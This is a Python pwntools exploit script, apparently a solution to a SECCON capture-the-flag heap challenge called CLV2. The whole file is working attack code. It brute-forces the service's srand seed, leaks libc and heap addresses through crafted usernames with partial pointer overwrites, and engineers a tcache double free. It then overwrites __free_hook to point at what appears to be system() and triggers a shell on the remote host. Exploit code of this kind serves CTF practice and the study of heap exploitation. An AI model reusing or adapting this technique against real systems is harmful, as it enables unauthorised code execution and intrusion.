#!/usr/bin/python

from pwn import *
import random
import ctypes

"""
  Probability : about 1/8
  Time : about 10 ~ 20 seconds
"""

def x():
  return s.recvuntil("xit\n")


def register(name):
  s.sendline("R")
  s.recvuntil("name?\n")
  s.sendline(name)
  return x()


def logout():
  s.sendline("L")
  return x()


def login(name):
  s.sendline("L")
  s.recvuntil("User : ")
  s.sendline(name)
  return x()


def go_play():
  s.sendline("P")
  return x()


def exit_play():
  s.sendline("E")
  return x()


def show(_type):
  s.sendline("S")
  tmp = s.recvuntil("o\n")

  if _type == 0:
    s.sendline("N")
    return tmp + x()

  s.sendline("Y")
  s.recvuntil("Hint : ")
  s.sendline("%d"%_type)
  return x()


def add(_type, prov, strong = 0):
  s.sendline("A")
  s.recvuntil("> ")
  s.send(prov)
  s.recvuntil("[3]\n")
  s.sendline("%d"%_type)

  if _type == 1:
    s.recvuntil("strong?\n")
    s.sendline("%d"%strong)

  return x()


def delete(key):
  s.sendline("D")
  s.recvuntil(": ")
  s.sendline("%d"%key)
  return x()


def main():
  rand_list  = []
  twins = []

  lib = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")

  x()
  print register("UU")
  go_play()
  vals = []
  for i in range(3):
    vals.append(int(add(1, "AAAABBBBCCCCDDDD", 0).split("!")[0].split("\n")[-1]))
  print vals
  for i in range(0, 0x10000, 4):
    lib.srand(i)
    tmp = [lib.rand()&0xffff,lib.rand()&0xffff,lib.rand()&0xffff]
    if vals == tmp:
      sp = i
      break

  s.info("SP : %x"%sp) 

  exit_play()
  logout()
  register("MAST=TT\x00"*(0x238/8)+p16(sp+0x104))
  logout()
  print register("TT\x00")
  go_play()

  print add(2, "X"*0x153+"MAST=XX\x00")
  exit_play()
  logout()
  register("XX\x00"+"Y"*0x235+p16(sp-0xd1))
  go_play()
  libc = u64(show(0).split("User : ")[1].split("\n")[0].ljust(8,"\x00")) - 0x1322ec
  s.info("LIBC: "+hex(libc))
  
  print add(2, "W"*(0x143)+"MAST=WW\x00")
  exit_play()
  logout()
  register("WW\x00"+"Y"*0x235+p16(sp-0xe1))
  go_play()
  heap = u64(show(0).split("User : ")[1].split("\n")[0].ljust(8,"\x00"))
  s.info("HEAP: "+hex(heap))


  
  for i in range(500):
    rand_list.append(lib.rand()&0xffff)
  
  for i in range(500):
    for j in range(i+1,500):
      if rand_list[i] == rand_list[j]:
        twins.append([i,j])

  print rand_list
  print twins

  for i in range((twins[0][0]+1)/20):
    add(1, "AAAA", 19)
    print "(%d/%d)"%(i, (twins[0][0]+1)/20)
  print add(1, "AAAA", (twins[0][0]+1)%20-1)
  

  gap = twins[0][1] - twins[0][0]
  for i in range(gap/20):
    add(1, "BBBB", 19)
    print "(%d/%d)"%(i, gap/20)

  print (twins[0][0]+1)/20
  print gap/20
  target = heap + 0x50 + 0x20*((twins[0][0]+1)/20 + gap/20)
  print hex(target)
  a0 = add(1, "X"*0x47, gap%20-1)
  delete(rand_list[twins[0][0]])
  delete(rand_list[twins[0][0]])

  free_hook_offset = 0x3ed8e8
  free_hook = libc + free_hook_offset

  print add(1, p64(free_hook)+"I"*0x3f,0)
  target = int(add(1, "/bin/sh\x00"+"I"*0x3f,0).split("!")[0])
  print `target`
  print add(1, p64(free_hook)+"I"*0x3f,0)
  print add(1, p64(libc+0x4f440)+"I"*0x3f,0)

  s.sendline("D")
  s.sendlineafter("Hint : ", "%d"%target)
  s.success("Baaaaam")
  s.interactive()


DEBUG = 0
if __name__ == "__main__":
  if DEBUG:
    s = process("./debug")
  else:
    #s = process("./CLV2")
    s = remote("clv2.pwn.seccon.jp", 31337)
  main()
